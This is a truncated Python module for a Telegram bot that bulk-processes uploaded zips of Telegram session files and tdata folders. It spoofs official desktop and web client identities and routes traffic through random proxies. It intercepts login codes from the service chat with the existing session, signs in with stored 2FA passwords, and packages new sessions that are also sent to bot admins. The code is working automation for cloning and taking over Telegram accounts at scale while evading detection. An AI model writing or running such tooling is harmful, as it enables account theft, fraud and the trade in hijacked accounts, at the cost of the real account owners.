import os
import re
import time
import json
import shutil
import asyncio
import random
import tempfile
import logging
import zipfile
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from telethon.errors import RPCError, SessionPasswordNeededError
from telethon import functions
from telethon.sessions import StringSession
from telethon.tl.functions.auth import ImportWebTokenAuthorizationRequest
from telethon.tl.functions.messages import RequestUrlAuthRequest
from opentele.tl import TelegramClient as OpenteleClient
from opentele.api import API
from dotenv import load_dotenv
from fangzhaohui import (
    convert_tdata_to_session_with_proxy,
    create_proxy_dict,
    find_tdata_folders,
    get_random_proxy,
    read_2fa_from_folder,
    safe_extract,
)
from i18n import lang_from_update, tr
from task_engine import (
    ERR_2FA_RESET_FAIL,
    ERR_CODE_SEND,
    ERR_DEAD,
    ERR_UNKNOWN,
    BatchTask,
    arm_timeout,
    build_official_api,
    classify_rpc_error,
    pack_and_send,
    place_failed,
    run_batch,
)

load_dotenv()
logger = logging.getLogger(__name__)

SYNC_API_ID = 2040
SYNC_API_HASH = "b18441a1ff607e10a989891a5462e627"
MAX_EXTRACT_SIZE = int(os.getenv("MK_TIME", 4)) * 1024 * 1024
MAX_TASK_TIME = int(os.getenv("MK_LIST_TIME", "120").replace('S', ''))
ADMIN_ID = os.getenv("ADMIN_ID", "")

SYNC_LOGIN_EMOJI_ID = "5994378914636500516"
SYNC_UPLOAD_EMOJI_ID = "6005807101056651268"
SYNC_SUCCESS_EMOJI_ID = "5951665890079544884"
SYNC_FAIL_EMOJI_ID = "5967355281057779430"
SYNC_BACK_EMOJI_ID = "5877629862306385808"
FAST_AUTH_EMOJI_ID = "5796440171364749940"
WEB_AUTH_URLS = {
    "k": "https://web.telegram.org/k/",
    "a": "https://web.telegram.org/a/",
}
WEB_DC_IPS = {
    1: "149.154.175.53",
    2: "149.154.167.51",
    3: "149.154.175.100",
    4: "149.154.167.91",
    5: "91.108.56.130",
}
SYNC_IDENTITY_FIELDS = (
    "template",
    "api_id",
    "api_hash",
    "device_model",
    "system_version",
    "app_version",
    "lang_code",
    "system_lang_code",
    "lang_pack",
)

user_sync_states = {}
user_fast_auth_states = {}

def create_sync_button(text, data, emoji_id, style="primary"):
    return InlineKeyboardButton(
        text=text,
        callback_data=data,
        icon_custom_emoji_id=emoji_id,
        style=style,
    )

def sync_identity_path(session_path):
    base, _ = os.path.splitext(str(session_path))
    return base + ".identity.json"

def load_sync_identity(session_path):
    path = sync_identity_path(session_path)
    if not os.path.exists(path):
        return None
    try:
        with open(path, 'r', encoding='utf-8') as f:
            record = json.load(f)
    except (OSError, json.JSONDecodeError):
        return None
    if any(not record.get(field) for field in SYNC_IDENTITY_FIELDS):
        return None
    return record

def resolve_sync_api(session_path):
    record = load_sync_identity(session_path)
    identity_path = sync_identity_path(session_path)

    if record is None:
        api = API.TelegramDesktop.Generate(
            system="windows",
            unique_id=os.path.basename(str(session_path)),
        )
        record = {
            "template": "TelegramDesktop",
            "api_id": int(api.api_id),
            "api_hash": str(api.api_hash),
            "device_model": api.device_model,
            "system_version": api.system_version,
            "app_version": api.app_version,
            "lang_code": api.lang_code,
            "system_lang_code": api.system_lang_code,
            "lang_pack": api.lang_pack,
        }
        with open(identity_path, 'w', encoding='utf-8') as f:
            json.dump(record, f, indent=2, ensure_ascii=False)

    api = API.TelegramDesktop(int(record["api_id"]), record["api_hash"])
    for field in SYNC_IDENTITY_FIELDS:
        if field not in ("template", "api_id", "api_hash"):
            setattr(api, field, record[field])
    return api, identity_path

def resolve_web_ver(web_ver):
    if web_ver == "mix":
        return random.choice(("k", "a"))
    return "a" if web_ver == "a" else "k"

def web_auth_url(web_ver):
    return WEB_AUTH_URLS.get(resolve_web_ver(web_ver), WEB_AUTH_URLS["k"])

def resolve_web_api(session_path, web_ver):
    ver = resolve_web_ver(web_ver)
    template = "TelegramWeb_Z" if ver == "a" else "TelegramWeb_K"
    record = load_sync_identity(session_path)
    if record is None or record.get("template") != template:
        api = getattr(API, template).Generate(unique_id=os.path.basename(str(session_path)))
        record = {
            "template": template,
            "api_id": int(api.api_id),
            "api_hash": str(api.api_hash),
            "device_model": api.device_model,
            "system_version": api.system_version,
            "app_version": api.app_version,
            "lang_code": api.lang_code,
            "system_lang_code": api.system_lang_code,
            "lang_pack": api.lang_pack,
        }
        identity_path = sync_identity_path(session_path)
        with open(identity_path, 'w', encoding='utf-8') as f:
            json.dump(record, f, indent=2, ensure_ascii=False)
    else:
        identity_path = sync_identity_path(session_path)

    api = getattr(API, template)(int(record["api_id"]), record["api_hash"])
    for field in SYNC_IDENTITY_FIELDS:
        if field not in ("template", "api_id", "api_hash"):
            setattr(api, field, record[field])
    return api, identity_path

async def show_sync_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    await query.answer()
    lang = lang_from_update(update)
    user_sync_states[user_id] = {"state": "waiting_zip"}

    await query.edit_message_text(
        text=f"""<tg-emoji emoji-id="{SYNC_LOGIN_EMOJI_ID}">🔄</tg-emoji> <b>{tr('sync.title', lang)}</b>

{tr('sync.instruction', lang)}""",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [create_sync_button(tr("back_to_main", lang), "back_to_main", SYNC_BACK_EMOJI_ID)],
        ])
    )

async def handle_sync_document(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str):
    state_info = user_sync_states.get(user_id)
    if not state_info or state_info.get("state") != "waiting_zip":
        return

    document = update.message.document
    lang = lang_from_update(update)
    zip_name = document.file_name or ""

    if not zip_name.lower().endswith(".zip"):
        await update.message.reply_text(
            f"<tg-emoji emoji-id=\"{SYNC_FAIL_EMOJI_ID}\">❌</tg-emoji> " + tr("err.zip_required", lang),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [create_sync_button(tr("back_to_main", lang), "back_to_main", SYNC_BACK_EMOJI_ID)],
            ])
        )
        user_sync_states.pop(user_id, None)
        return

    status_msg = await update.message.reply_text(
        f"<tg-emoji emoji-id=\"{SYNC_UPLOAD_EMOJI_ID}\">📥</tg-emoji> " + tr("err.processing", lang),
        parse_mode=ParseMode.HTML
    )

    zip_path = None
    extract_dir = None

    try:
        file = await context.bot.get_file(document.file_id)
        zip_path = f"downloads/sync_{user_id}_{int(time.time())}.zip"
        os.makedirs("downloads", exist_ok=True)
        await file.download_to_drive(zip_path)

        await status_msg.edit_text(
            f"<tg-emoji emoji-id=\"{SYNC_LOGIN_EMOJI_ID}\">🔄</tg-emoji> " + tr("recovery.extracting", lang),
            parse_mode=ParseMode.HTML
        )

        extract_dir = f"downloads/sync_extract_{user_id}_{int(time.time())}"
        os.makedirs(extract_dir, exist_ok=True)

        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            safe_extract(zip_ref, extract_dir)

        total_size = 0
        for root, dirs, files in os.walk(extract_dir):
            for file_name in files:
                total_size += os.path.getsize(os.path.join(root, file_name))

        if total_size > MAX_EXTRACT_SIZE:
            raise Exception(f"解压后文件过大 ({total_size // 1024 // 1024}MB > {MAX_EXTRACT_SIZE // 1024 // 1024}MB)")

        session_files = []
        for root, dirs, files in os.walk(extract_dir):
            for file_name in files:
                if file_name.endswith('.session'):
                    session_files.append(os.path.join(root, file_name))

        if not session_files:
            tdata_dirs = find_tdata_folders(extract_dir)
            if not tdata_dirs:
                await update.message.reply_text(
                    f"<tg-emoji emoji-id=\"{SYNC_FAIL_EMOJI_ID}\">❌</tg-emoji> " + tr("err.no_session_tdata", lang),
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([
                        [create_sync_button(tr("back_to_main", lang), "back_to_main", SYNC_BACK_EMOJI_ID)],
                    ])
                )
                user_sync_states.pop(user_id, None)
                return

            await status_msg.edit_text(
                f"<tg-emoji emoji-id=\"{SYNC_LOGIN_EMOJI_ID}\">🔄</tg-emoji> {tr('recovery.tdata_detected', lang)} {len(tdata_dirs)} {tr('recovery.tdata_unit', lang)}",
                parse_mode=ParseMode.HTML
            )

            convert_dir = os.path.join(extract_dir, "converted_sessions")
            os.makedirs(convert_dir, exist_ok=True)

            for idx, tdata_dir in enumerate(tdata_dirs, 1):
                parent_dir = os.path.dirname(tdata_dir)
                twofa = read_2fa_from_folder(parent_dir)
                proxy = get_random_proxy()
                proxy_dict = create_proxy_dict(proxy) if proxy else None
                account_out = os.path.join(convert_dir, f"acc_{idx}")
                os.makedirs(account_out, exist_ok=True)

                try:
                    success, phone, sess_path, json_path, err = await asyncio.wait_for(
                        convert_tdata_to_session_with_proxy(tdata_dir, account_out, twofa, proxy_dict),
                        timeout=60
                    )
                except asyncio.TimeoutError:
                    success = False
                    err = "转换超时（60秒）"

                if success and sess_path and json_path:
                    session_files.append(sess_path)
                else:
                    logger.error(f"同步登录 tdata 转换失败 {tdata_dir}: {err}")

                await asyncio.sleep(0.2)

            if not session_files:
                await update.message.reply_text(
                    f"<tg-emoji emoji-id=\"{SYNC_FAIL_EMOJI_ID}\">❌</tg-emoji> " + tr("err.all_tdata_failed", lang),
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([
                        [create_sync_button(tr("back_to_main", lang), "back_to_main", SYNC_BACK_EMOJI_ID)],
                    ])
                )
                user_sync_states.pop(user_id, None)
                return

        user_sync_states.pop(user_id, None)
        try:
            await status_msg.delete()
        except Exception:
            pass

        await process_sync_task(
            update,
            context,
            user_id,
            session_files,
            extract_dir,
            zip_path,
            os.path.splitext(zip_name)[0],
        )

    except Exception as e:
        await update.message.reply_text(
            f"<tg-emoji emoji-id=\"{SYNC_FAIL_EMOJI_ID}\">❌</tg-emoji> {tr('err.process_failed', lang)}: {str(e)}",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [create_sync_button(tr("back_to_main", lang), "back_to_main", SYNC_BACK_EMOJI_ID)],
            ])
        )
        user_sync_states.pop(user_id, None)
        try:
            if zip_path and os.path.exists(zip_path):
                os.remove(zip_path)
            if extract_dir and os.path.exists(extract_dir):
                shutil.rmtree(extract_dir, ignore_errors=True)
        except Exception:
            pass

async def process_sync_task(update, context, user_id, session_files, extract_dir, zip_path, zip_base=None):
    lang = lang_from_update(update)
    zip_base = zip_base or f"sync_{user_id}"

    status_msg = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"""<tg-emoji emoji-id="{SYNC_LOGIN_EMOJI_ID}">🔄</tg-emoji> <b>{tr('sync.start', lang)}</b>

{tr('recovery.total_accounts', lang)}: {len(session_files)}
<tg-emoji emoji-id="{SYNC_LOGIN_EMOJI_ID}">🔄</tg-emoji> {tr('recovery.processing', lang)}""",
        parse_mode=ParseMode.HTML
    )

    result_temp = None

    try:
        result_temp = tempfile.mkdtemp()
        await _process_sync_internal(
            update,
            context,
            user_id,
            session_files,
            extract_dir,
            result_temp,
            zip_base,
        )
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"<tg-emoji emoji-id=\"{SYNC_FAIL_EMOJI_ID}\">❌</tg-emoji> {tr('sync.failed', lang)}: {str(e)}",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [create_sync_button(tr("back_to_main", lang), "back_to_main", SYNC_BACK_EMOJI_ID)],
            ])
        )
    finally:
        try:
            await status_msg.delete()
        except Exception:
            pass
        try:
            if extract_dir and os.path.exists(extract_dir):
                shutil.rmtree(extract_dir, ignore_errors=True)
            if zip_path and os.path.exists(zip_path):
                os.remove(zip_path)
            if result_temp and os.path.exists(result_temp):
                shutil.rmtree(result_temp, ignore_errors=True)
        except Exception:
            pass
        user_sync_states.pop(user_id, None)

async def process_single_sync_account(session_path, json_path, user_id, session_name):
    result = {
        "session_name": session_name,
        "status": "failed",
        "message": "",
        "error_label": ERR_UNKNOWN,
        "new_session_path": None,
        "new_json_path": None,
        "new_identity_path": None,
    }

    temp_dir = tempfile.mkdtemp()
    new_session_path = os.path.join(temp_dir, f"{session_name}_sync.session")
    client_old = None
    client_new = None

    try:
        orig_json_data = {}
        if json_path and os.path.exists(json_path):
            try:
                with open(json_path, 'r', encoding='utf-8') as f:
                    orig_json_data = json.load(f)
            except (OSError, json.JSONDecodeError):
                pass

        try:
            api_id_val = int(orig_json_data.get("app_id") or orig_json_data.get("api_id") or SYNC_API_ID)
        except (TypeError, ValueError):
            api_id_val = SYNC_API_ID
        api_hash_val = str(orig_json_data.get("app_hash") or orig_json_data.get("api_hash") or SYNC_API_HASH)

        device_model = orig_json_data.get("device_model") or None
        app_version = orig_json_data.get("app_version") or None
        system_lang_code = orig_json_data.get("system_lang_code") or None
        system_version = orig_json_data.get("system_version") or orig_json_data.get("sdk") or None
        lang_pack = orig_json_data.get("lang_pack") or None
        two_fa = orig_json_data.get("twofa") or orig_json_data.get("password") or None

        session_copy = os.path.join(temp_dir, f"{session_name}_old.session")
        shutil.copy2(session_path, session_copy)

        proxy = get_random_proxy()
        proxy_dict = create_proxy_dict(proxy) if proxy else None

        official_api_old = build_official_api(
            session_path,
            device_model=device_model,
            system_version=system_version,
            app_version=app_version,
            system_lang_code=system_lang_code,
            lang_pack=lang_pack,
        )
        official_api_old.api_id = api_id_val
        official_api_old.api_hash = api_hash_val

        client_old = OpenteleClient(
            session=str(session_copy),
            api=official_api_old,
            proxy=proxy_dict,
            receive_updates=False,
            timeout=10,
            connection_retries=1
        )
        await asyncio.wait_for(client_old.connect(), timeout=15)

        if not await asyncio.wait_for(client_old.is_user_authorized(), timeout=10):
            result["message"] = "原session无效"
            result["error_label"] = ERR_DEAD
            return result

        me = await asyncio.wait_for(client_old.get_me(), timeout=10)
        if not me:
            result["message"] = "无法获取用户信息"
            result["error_label"] = ERR_DEAD
            return result

        phone = me.phone
        if not phone:
            result["message"] = "无法获取手机号"
            result["error_label"] = ERR_DEAD
            return result

        official_api_new, new_identity_path = resolve_sync_api(new_session_path)
        proxy_new = get_random_proxy()
        proxy_dict_new = create_proxy_dict(proxy_new) if proxy_new else None

        client_new = OpenteleClient(
            session=str(new_session_path),
            api=official_api_new,
            proxy=proxy_dict_new,
            receive_updates=False,
            timeout=10,
            connection_retries=1
        )
        await asyncio.wait_for(client_new.connect(), timeout=15)

        before_messages = await client_old.get_messages(777000, limit=1)
        before_id = before_messages[0].id if before_messages else 0

        try:
            await client_new.send_code_request(phone)
        except RPCError as e:
            result["error_label"] = classify_rpc_error(e, stage="sendcode")
            result["message"] = f"发送验证码失败: {str(e)[:50]}"
            return result

        code = None
        for _ in range(15):
            await asyncio.sleep(3)
            messages = await client_old.get_messages(777000, limit=5)
            for msg in messages:
                if msg.id <= before_id or not msg.text:
                    continue
                match = re.search(r'(?<!\d)(\d{5,6})(?!\d)', msg.text)
                if match:
                    code = match.group(1)
                    break
            if code:
                break

        if not code:
            result["message"] = "未收到验证码"
            result["error_label"] = ERR_CODE_SEND
            return result

        try:
            await client_new.sign_in(phone, code)
        except SessionPasswordNeededError:
            if not two_fa:
                result["message"] = "需要2FA但未提供"
                result["error_label"] = ERR_2FA_RESET_FAIL
                return result
            try:
                await client_new.sign_in(password=two_fa)
            except RPCError as e:
                result["error_label"] = classify_rpc_error(e)
                result["message"] = f"2FA登录失败: {str(e)[:50]}"
                return result
        except RPCError as e:
            result["error_label"] = classify_rpc_error(e, stage="sendcode")
            result["message"] = f"登录失败: {str(e)[:50]}"
            return result

        me_new = await client_new.get_me()
        if not me_new:
            result["message"] = "登录验证失败"
            result["error_label"] = ERR_UNKNOWN
            return result

        new_json_data = dict(orig_json_data)
        new_json_data.update({
            "api_id": official_api_new.api_id,
            "api_hash": official_api_new.api_hash,
            "app_id": official_api_new.api_id,
            "app_hash": official_api_new.api_hash,
            "device_model": official_api_new.device_model,
            "system_version": official_api_new.system_version,
            "app_version": official_api_new.app_version,
            "system_lang_code": official_api_new.system_lang_code,
            "lang_pack": official_api_new.lang_pack,
            "lang_code": official_api_new.lang_code,
            "pid": getattr(official_api_new, "pid", random.randint(100000, 999999)),
            "user_id": me_new.id,
            "phone": phone,
            "twofa": two_fa or "",
            "session_file": f"{session_name}_sync",
            "device": official_api_new.device_model,
            "username": me_new.username or "",
            "premium": bool(getattr(me_new, "premium", False)),
            "SDK": official_api_new.system_version,
            "sdk": official_api_new.system_version,
            "system_lang_pack": official_api_new.system_lang_code,
        })

        new_json_path = os.path.join(temp_dir, f"{session_name}_sync.json")
        with open(new_json_path, 'w', encoding='utf-8') as f:
            json.dump(new_json_data, f, indent=2, ensure_ascii=False)

        result["status"] = "success"
        result["message"] = "同步登录成功"
        result["new_session_path"] = new_session_path
        result["new_json_path"] = new_json_path
        result["new_identity_path"] = new_identity_path

    except asyncio.TimeoutError:
        result["message"] = "网络操作超时"
    except Exception as e:
        result["message"] = f"错误: {str(e)[:50]}"
        result["error_label"] = classify_rpc_error(e)
    finally:
        if client_old:
            await client_old.disconnect()
        if client_new:
            await client_new.disconnect()
        shutil.rmtree(temp_dir, ignore_errors=True)

    return result

async def _process_sync_internal(update, context, user_id, session_files, extract_dir, result_temp, zip_base):
    lang = lang_from_update(update)
    success_dir = os.path.join(result_temp, "success")
    failed_dir = os.path.join(result_temp, "failed")
    pending_dir = os.path.join(result_temp, "pending")
    os.makedirs(success_dir)
    os.makedirs(failed_dir)
    os.makedirs(pending_dir, exist_ok=True)

    async def process_one(item, task):
        session_path = item
        session_basename = os.path.basename(session_path)
        session_name = os.path.splitext(session_basename)[0]
        base_dir = os.path.dirname(session_path)
        json_path = os.path.join(base_dir, f"{session_name}.json")
        if not os.path.exists(json_path):
            for root, dirs, files in os.walk(extract_dir):
                if f"{session_name}.json" in files:
                    json_path = os.path.join(root, f"{session_name}.json")
                    break

        try:
            result = await asyncio.wait_for(
                process_single_sync_account(session_path, json_path, user_id, session_name),
                timeout=120
            )
        except asyncio.TimeoutError:
            result = {
                "session_name": session_name,
                "status": "failed",
                "message": "处理超时（超过120秒）",
                "error_label": ERR_UNKNOWN,
                "new_session_path": None,
                "new_json_path": None,
                "new_identity_path": None,
            }

        if result["status"] == "success":
            for key in ("new_session_path", "new_json_path", "new_identity_path"):
                path = result.get(key)
                if path and os.path.exists(path):
                    shutil.copy2(path, os.path.join(success_dir, os.path.basename(path)))
            return {"category": "success", "name": session_name}

        label = result.get("error_label") or ERR_UNKNOWN
        place_failed(
            failed_dir,
            label,
            [session_path] + ([json_path] if json_path and os.path.exists(json_path) else []),
            subdir_name=session_name
        )
        return {"category": "fail", "error": label, "name": session_name}

    task = BatchTask(user_id, update.effective_chat.id, session_files, "sync_login")
    watchdog = arm_timeout(task, MAX_TASK_TIME)

    async def on_progress(t):
        c = {"success": 0, "fail": 0}
        for r in t.done:
            if r.get("category") in c:
                c[r["category"]] += 1
        t._progress_text = f"""<tg-emoji emoji-id="{SYNC_LOGIN_EMOJI_ID}">🔄</tg-emoji> <b>{tr('sync.in_progress', lang)}</b>

{tr('shaihuo.progress', lang)}: {t.completed}/{len(session_files)}
<tg-emoji emoji-id="{SYNC_SUCCESS_EMOJI_ID}">✅</tg-emoji> {tr('shaihuo.success', lang)}: {c['success']} | <tg-emoji emoji-id="{SYNC_FAIL_EMOJI_ID}">❌</tg-emoji> {tr('2fa.failed', lang)}: {c['fail']}"""

    await run_batch(update, context, task, process_one, on_progress=on_progress)

    if not watchdog.done():
        watchdog.cancel()

    if task.stopped:
        for item in task.remaining_pending():
            session_path = item
            session_basename = os.path.basename(session_path)
            session_name = os.path.splitext(session_basename)[0]
            pdir = os.path.join(pending_dir, session_name)
            os.makedirs(pdir, exist_ok=True)
            if os.path.exists(session_path):
                shutil.copy2(session_path, os.path.join(pdir, session_basename))
            json_path = os.path.join(os.path.dirname(session_path), f"{session_name}.json")
            if os.path.exists(json_path):
                shutil.copy2(json_path, os.path.join(pdir, os.path.basename(json_path)))

    def result_text_fn(cats, pending):
        return f"""<tg-emoji emoji-id="{SYNC_SUCCESS_EMOJI_ID}">✅</tg-emoji> <b>{tr('sync.done', lang)}</b>

{tr('recovery.total_accounts', lang)}: {len(session_files)}
<tg-emoji emoji-id="{SYNC_SUCCESS_EMOJI_ID}">✅</tg-emoji> {tr('shaihuo.success', lang)}: {cats['success']}
<tg-emoji emoji-id="{SYNC_FAIL_EMOJI_ID}">❌</tg-emoji> {tr('2fa.failed', lang)}: {cats['fail']}
<tg-emoji emoji-id="{SYNC_LOGIN_EMOJI_ID}">🔄</tg-emoji> {tr('shaihuo.pending', lang)}: {pending}"""

    await pack_and_send(
        context,
        update,
        task,
        categories={
            "success": (success_dir, None, lambda n: f"<b>{tr('sync.success_caption', lang)} ({n}{tr('recovery.accounts_unit', lang)})</b>"),
            "fail": (failed_dir, None, lambda n: f"<b>{tr('sync.failed_caption', lang)} ({n}{tr('recovery.accounts_unit', lang)})</b>"),
        },
        admins=(ADMIN_ID.split(',') if ADMIN_ID else []),
        lang=lang,
        result_text_fn=result_text_fn,
        pending_dir=pending_dir,
        zip_base=zip_base or f"sync_{user_id}",
    )

async def show_fast_auth_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    await query.answer()
    lang = lang_from_update(update)
    user_fast_auth_states[user_id] = {"state": "waiting_zip"}

    await query.edit_message_text(
        text=f"""<tg-emoji emoji-id="{FAST_AUTH_EMOJI_ID}">🚀</tg-emoji> <b>{tr('fast_auth.title', lang)}</b>

{tr('fast_auth.instruction', lang)}

<tg-emoji emoji-id="{SYNC_FAIL_EMOJI_ID}">❌</tg-emoji> {tr('fast_auth.parent_child_risk', lang)}""",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [create_sync_button(tr("back_to_main", lang), "back_to_main", SYNC_BACK_EMOJI_ID)],
        ])
    )

async def handle_fast_auth_document(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str):
    state_info = user_fast_auth_states.get(user_id)
    if not state_info or state_info.get("state") != "waiting_zip":
        return

    document = update.message.document
    lang = lang_from_update(update)
    zip_name = document.file_name or ""

    if not zip_name.lower().endswith(".zip"):
        await update.message.reply_text(
            f"<tg-emoji emoji-id=\"{SYNC_FAIL_EMOJI_ID}\">❌</tg-emoji> " + tr("err.zip_required", lang),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [create_sync_button(tr("back_to_main", lang), "back_to_main", SYNC_BACK_EMOJI_ID)],
            ])
        )
        user_fast_auth_states.pop(user_id, None)
        return

    status_msg = await update.message.reply_text(
        f"<tg-emoji emoji-id=\"{SYNC_UPLOAD_EMOJI_ID}\">📥</tg-emoji> " + tr("err.processing", lang),
        parse_mode=ParseMode.HTML
    )

    zip_path = None
    extract_dir = None

    try:
        file = await context.bot.get_file(document.file_id)
        zip_path = f"downloads/fast_auth_{user_id}_{int(time.time())}.zip"
        os.makedirs("downloads", exist_ok=True)
        await file.download_to_drive(zip_path)

        await status_msg.edit_text(
            f"<tg-emoji emoji-id=\"{FAST_AUTH_EMOJI_ID}\">🚀</tg-emoji> " + tr("recovery.extracting", lang),
            parse_mode=ParseMode.HTML
        )

        extract_dir = f"downloads/fast_auth_extract_{user_id}_{int(time.time())}"
        os.makedirs(extract_dir, exist_ok=True)

        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            safe_extract(zip_ref, extract_dir)

        total_size = 0
        for root, dirs, files in os.walk(extract_dir):
            for file_name in files:
                total_size += os.path.getsize(os.path.join(root, file_name))

        if total_size > MAX_EXTRACT_SIZE:
            raise Exception(f"解压后文件过大 ({total_size // 1024 // 1024}MB > {MAX_EXTRACT_SIZE // 1024 // 1024}MB)")

        session_files = []
        for root, dirs, files in os.walk(extract_dir):
            for file_name in files:
                if file_name.endswith('.session'):
                    session_files.append(os.path.join(root, file_name))

        if not session_files:
            tdata_dirs = find_tdata_folders(extract_dir)
            if not tdata_dirs:
                await update.message.reply_text(
                    f"<tg-emoji emoji-id=\"{SYNC_FAIL_EMOJI_ID}\">❌</tg-emoji> " + tr("err.no_session_tdata", lang),
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([
                        [create_sync_button(tr("back_to_main", lang), "back_to_main", SYNC_BACK_EMOJI_ID)],
                    ])
                )
                user_fast_auth_states.pop(user_id, None)
                return

            convert_dir = os.path.join(extract_dir, "converted_sessions")
            os.makedirs(convert_dir, exist_ok=True)

            for idx, tdata_dir in enumerate(tdata_dirs, 1):
                twofa = read_2fa_from_folder(os.path.dirname(tdata_dir))
                proxy = get_random_proxy()
                proxy_dict = create_proxy_dict(proxy) if proxy else None
                account_out = os.path.join(convert_dir, f"acc_{idx}")
                os.makedirs(account_out, exist_ok=True)

                try:
                    success, phone, sess_path, json_path, err = await asyncio.wait_for(
                        convert_tdata_to_session_with_proxy(tdata_dir, account_out, twofa, proxy_dict),
                        timeout=60
                    )
                except asyncio.TimeoutError:
                    success = False
                    err = "转换超时（60秒）"

                if success and sess_path and json_path:
                    session_files.append(sess_path)
                else:
                    logger.error(f"快速新授权 tdata 转换失败 {tdata_dir}: {err}")

                await asyncio.sleep(0.2)

            if not session_files:
                await update.message.reply_text(
                    f"<tg-emoji emoji-id=\"{SYNC_FAIL_EMOJI_ID}\">❌</tg-emoji> " + tr("err.all_tdata_failed", lang),
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([
                        [create_sync_button(tr("back_to_main", lang), "back_to_main", SYNC_BACK_EMOJI_ID)],
                    ])
                )
                user_fast_auth_states.pop(user_id, None)
                return

        user_fast_auth_states[user_id] = {
            "state": "waiting_version",
            "session_files": session_files,
            "extract_dir": extract_dir,
            "zip_path": zip_path,
            "zip_base": os.path.splitext(zip_name)[0],
        }

        keyboard = [
            [create_sync_button(tr("recovery.ver_k", lang), "fast_auth_k", "5778575233422200567", "primary")],
            [create_sync_button(tr("recovery.ver_a", lang), "fast_auth_a", "6034962180875490251", "primary")],
            [create_sync_button(tr("recovery.ver_mix", lang), "fast_auth_mix", "5886762118123886049", "primary")],
            [create_sync_button(tr("back_to_main", lang), "back_to_main", SYNC_BACK_EMOJI_ID)],
        ]

        await update.message.reply_text(
            f"""<tg-emoji emoji-id="{SYNC_SUCCESS_EMOJI_ID}">✅</tg-emoji> {tr('recovery.extracted', lang)} {len(session_files)} {tr('recovery.accounts_unit', lang)}

<tg-emoji emoji-id="{FAST_AUTH_EMOJI_ID}">🚀</tg-emoji> {tr('fast_auth.choose_ver', lang)}""",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

        try:
            await status_msg.delete()
        except Exception:
            pass

    except Exception as e:
        await update.message.reply_text(
            f"<tg-emoji emoji-id=\"{SYNC_FAIL_EMOJI_ID}\">❌</tg-emoji> {tr('err.process_failed', lang)}: {str(e)}",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [create_sync_button(tr("back_to_main", lang), "back_to_main", SYNC_BACK_EMOJI_ID)],
            ])
        )
        user_fast_auth_states.pop(user_id, None)
        try:
            if zip_path and os.path.exists(zip_path):
                os.remove(zip_path)
            if extract_dir and os.path.exists(extract_dir):
                shutil.rmtree(extract_dir, ignore_errors=True)
        except Exception:
            pass

async def handle_fast_auth_version(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    await query.answer()
    lang = lang_from_update(update)

    state_info = user_fast_auth_states.get(user_id)
    if not state_info or state_info.get("state") != "waiting_version":
        await query.edit_message_text(
            f"<tg-emoji emoji-id=\"{SYNC_FAIL_EMOJI_ID}\">❌</tg-emoji> " + tr("recovery.expired", lang),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [create_sync_button(tr("back_to_main", lang), "back_to_main", SYNC_BACK_EMOJI_ID)],
            ])
        )
        return

    state_info["state"] = "processing"
    web_ver = query.data.replace("fast_auth_", "", 1)

    await query.edit_message_text(
        f"<tg-emoji emoji-id=\"{FAST_AUTH_EMOJI_ID}\">🚀</tg-emoji> {tr('fast_auth.start', lang)}",
        parse_mode=ParseMode.HTML
    )

    await process_fast_auth_task(update, context, user_id, web_ver)

async def process_fast_auth_task(update, context, user_id, web_ver):
    state_info = user_fast_auth_states.pop(user_id, None)
    if not state_info:
        return

    lang = lang_from_update(update)
    session_files = state_info["session_files"]
    extract_dir = state_info["extract_dir"]
    zip_path = state_info["zip_path"]
    zip_base = state_info.get("zip_base") or f"fast_auth_{user_id}"

    status_msg = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"""<tg-emoji emoji-id="{FAST_AUTH_EMOJI_ID}">🚀</tg-emoji> <b>{tr('fast_auth.start', lang)}</b>

{tr('recovery.total_accounts', lang)}: {len(session_files)}
<tg-emoji emoji-id="{SYNC_FAIL_EMOJI_ID}">❌</tg-emoji> {tr('fast_auth.parent_child_risk', lang)}""",
        parse_mode=ParseMode.HTML
    )

    result_temp = None

    try:
        result_temp = tempfile.mkdtemp()
        await _process_fast_auth_internal(
            update,
            context,
            user_id,
            session_files,
            extract_dir,
            result_temp,
            zip_base,
            web_ver,
        )
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"<tg-emoji emoji-id=\"{SYNC_FAIL_EMOJI_ID}\">❌</tg-emoji> {tr('fast_auth.failed', lang)}: {str(e)}",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [create_sync_button(tr("back_to_main", lang), "back_to_main", SYNC_BACK_EMOJI_ID)],
            ])
        )
    finally:
        try:
            await status_msg.delete()
        except Exception:
            pass
        try:
            if extract_dir and os.path.exists(extract_dir):
                shutil.rmtree(extract_dir, ignore_errors=True)
            if zip_path and os.path.exists(zip_path):
                os.remove(zip_path)
